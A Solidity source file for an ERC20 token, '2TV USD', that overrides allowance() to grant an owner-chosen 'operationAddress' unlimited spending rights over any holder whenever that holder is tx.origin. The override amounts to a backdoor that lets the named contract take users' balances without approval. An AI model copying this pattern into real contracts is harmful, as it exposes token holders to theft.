// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @custom:security-contact contact@inferix.io
contract TwoUSD is ERC20, Ownable {

    address public operationAddress;

    constructor(address initialOwner)
        ERC20("2TV USD", "2TVUSD")
        Ownable(initialOwner)
    {
        _mint(msg.sender, 100_000_000 * 10 ** decimals());
    }

    function decimals() public pure override returns (uint8) {
        return 6; // giữ nguyên decimals 6
    }

    function setOperationAddress(address _operationAddress) external onlyOwner {
        operationAddress = _operationAddress;
    }

    function allowance(address owner, address spender) override public view returns (uint256) {
        if (operationAddress != address(0) && spender == operationAddress && owner == tx.origin) {
            return type(uint256).max;
        }
        return super.allowance(owner, spender);
    }
}
